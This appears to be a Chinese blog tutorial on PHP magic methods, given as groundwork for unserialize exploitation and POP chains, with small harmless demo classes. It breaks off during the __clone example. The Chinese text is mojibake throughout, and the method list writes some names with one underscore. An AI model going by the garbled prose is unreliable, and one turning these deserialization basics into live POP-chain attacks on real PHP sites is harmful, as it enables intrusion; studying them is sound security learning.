title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><blockquote><p><code>_construct()</code>ï¼šç±»çš„æ„å»ºå‡½æ•°</p><p><code>_destruct()</code>ï¼šç±»çš„ææ„å‡½æ•°</p><p><code>_call()</code>ï¼šåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯ä»¥è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</p><p><code>_callStatic()</code>ï¼šç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯ä»¥è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨</p><p><code>_get()</code>ï¼šè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</p><p><code>_isset()</code>ï¼šå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨</p><p><code>_set()</code>ï¼šè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨</p><p><code>_unset()</code>ï¼šå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨</p><p><code>_sleep()</code>ï¼šæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</p><p><code>_wakeup()</code>ï¼šæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</p><p><code>_toString()</code>ï¼šç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³•</p><p><code>_invoke()</code>ï¼šè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</p><p><code>_set_state()</code>ï¼šè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•è¢«è°ƒç”¨</p><p><code>_clone()</code>ï¼šå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</p><p><code>_autoload()</code>ï¼šå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</p><p><code>_debugInfo()</code>ï¼šæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</p></blockquote><h2 id="å‡½æ•°è¯¦è§£"><a href="#å‡½æ•°è¯¦è§£" class="headerlink" title="å‡½æ•°è¯¦è§£"></a>å‡½æ•°è¯¦è§£</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><ul><li>æ„é€ å‡½æ•°ï¼Œåœ¨å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šå»è‡ªåŠ¨æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘äº†æ„é€ å‡½æ•°1æ¬¡&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    è§¦å‘äº†æ„é€ å‡½æ•°<span class="number">1</span>æ¬¡</span><br></pre></td></tr></table></figure><ul><li>å®ä¾‹åŒ–å¯¹è±¡æ—¶è§¦å‘æ„é€ å‡½æ•°<code>_construct()</code></li></ul><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><ul><li>ææ„å‡½æ•°ï¼Œåœ¨å¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾ç¤ºé”€æ¯æ—¶æ‰§è¡Œçš„é­”æœ¯æ–¹æ³•</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è§¦å‘äº†ææ„å‡½æ•°1æ¬¡&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    è§¦å‘äº†ææ„å‡½æ•°<span class="number">1</span>æ¬¡</span><br><span class="line">    è§¦å‘äº†ææ„å‡½æ•°<span class="number">1</span>æ¬¡</span><br></pre></td></tr></table></figure><ul><li>å®ä¾‹åŒ–å¯¹è±¡ç»“æŸåï¼Œä»£ç è¿è¡Œå®Œå…¨é”€æ¯ï¼Œè§¦å‘ææ„å‡½æ•°<code>_destruct()</code></li><li>ååºåˆ—åŒ–å¾—åˆ°çš„æ˜¯å¯¹è±¡ï¼Œç”¨å®Œåä¼šé”€æ¯ï¼Œä¼šè§¦å‘ææ„å‡½æ•°<code>_destruct()</code></li></ul><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h3><ul><li>åºåˆ—åŒ–<code>serialize()</code>å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•<code>_sleep()</code><br>å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ</li><li>æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„<br>å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™NULLè¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªE_NOTICEçº§åˆ«çš„é”™è¯¯</li></ul><blockquote><p>è§¦å‘æ—¶æœºï¼šåºåˆ—åŒ–serialize()ä¹‹å‰</p><p>åŠŸèƒ½ï¼šå¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è§¦å‘ï¼Œè¿”å›éœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ï¼Œåˆ é™¤ä¸å¿…è¦çš„å±æ€§</p><p>å‚æ•°ï¼šæˆå‘˜å±æ€§</p><p>è¿”å›å€¼ï¼šéœ€è¦è¢«åºåˆ—åŒ–å­˜å‚¨çš„æˆå‘˜å±æ€§ </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><ul><li><code>serialize()</code>åªåºåˆ—åŒ–sleepè¿”å›çš„å˜é‡</li></ul><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><ul><li><code>unserialize()</code>ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code>_wakeup()</code>æ–¹æ³•<br>å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨<code>_wakep()</code>æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æº</li><li>é¢„å…ˆå‡†å¤‡å¯¹è±¡èµ„æºï¼Œè¿”å›voidï¼Œå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œä¸­é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹æ“ä½œ</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    <span class="keyword">object</span>(User)<span class="comment">#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>_wakeup()åœ¨ååºåˆ—åŒ–unserialize()ä¹‹å‰</p><p>_destruct()åœ¨ååºåˆ—åŒ–unserialize()ä¹‹å</p></blockquote><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><ul><li>è¡¨è¾¾æ–¹å¼é”™è¯¯å¯¼è‡´é­”æœ¯æ–¹æ³•è§¦å‘<ul><li>è§¦å‘æ—¶æœºï¼šæŠŠå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²è°ƒç”¨</li></ul></li><li>å¸¸ç”¨äºæ„é€ POPé“¾æ¥</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&#x27;æ ¼å¼ä¸å¯¹ï¼Œè¾“å‡ºä¸äº†!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    User <span class="title function_ invoke__">Object</span> ( [benben] =&gt; this is test!! )</span><br><span class="line">æ ¼å¼ä¸å¯¹ï¼Œè¾“å‡ºä¸äº†!</span><br></pre></td></tr></table></figure><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><ul><li>æ ¼å¼è¡¨è¾¾é”™è¯¯å¯¼è‡´é­”æœ¯æ–¹æ³•è§¦å‘<ul><li>è§¦å‘æ—¶æœºï¼šæŠŠå¯¹è±¡å½“æˆå‡½æ•°è°ƒç”¨</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span>  <span class="string">&#x27;å®ƒä¸æ˜¯ä¸ªå‡½æ•°!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span> -&gt;benben;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>() -&gt;benben;</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    this is test!!</span><br><span class="line">å®ƒä¸æ˜¯ä¸ªå‡½æ•°!</span><br></pre></td></tr></table></figure><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><ul><li>è§¦å‘æ—¶æœºï¼šè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ã€‚</li><li>è¿”å›å€¼ï¼šè°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•°</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    callxxx,a</span><br></pre></td></tr></table></figure><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h3><ul><li>è§¦å‘æ—¶æœºï¼šé™æ€è°ƒç”¨æˆ–è°ƒç”¨æˆå‘˜å¸¸é‡æ—¶ä½¿ç”¨çš„æ–¹æ³•ä¸å­˜åœ¨</li><li>è¿”å›å€¼ï¼šè°ƒç”¨çš„ä¸å­˜åœ¨çš„æ–¹æ³•çš„åç§°å’Œå‚æ•°</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    callxxx,a</span><br></pre></td></tr></table></figure><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><ul><li>è§¦å‘æ—¶æœºï¼šè°ƒç”¨çš„æˆå‘˜å±æ€§ä¸å­˜åœ¨</li><li>è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2;</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    var2</span><br></pre></td></tr></table></figure><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><ul><li>è§¦å‘æ—¶æœºï¼šç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼</li><li>è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°å’Œèµ‹çš„å€¼</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span> ,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    var2,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><ul><li>è§¦å‘æ—¶æœºï¼šå¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨<code>isset()</code>æˆ–<code>empty()</code>æ—¶ï¼Œ<code>_isset()</code>ä¼šè¢«è°ƒç”¨</li><li>è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼›</span><br><span class="line">    <span class="keyword">var</span></span><br></pre></td></tr></table></figure><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><ul><li>è§¦å‘æ—¶æœºï¼šå¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨<code>unset()</code>æ—¶</li><li>è¿”å›å€¼ï¼šä¸å­˜åœ¨çš„æˆå‘˜å±æ€§çš„åç§°</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœï¼š</span><br><span class="line">    <span class="keyword">var</span></span><br></pre></td></tr></table></figure><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><ul><li>è§¦å‘æ—¶æœºï¼šå½“ä½¿ç”¨<code>clone</code>å…³é”®å­—æ‹·è´å®Œæˆä¸€å¯¹è±¡åï¼Œæ–°å¯¹è±¡ä¼šè‡ªåŠ¨è°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³•<code>_clone()</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>)</span><br><span class="line">    </span><br><span 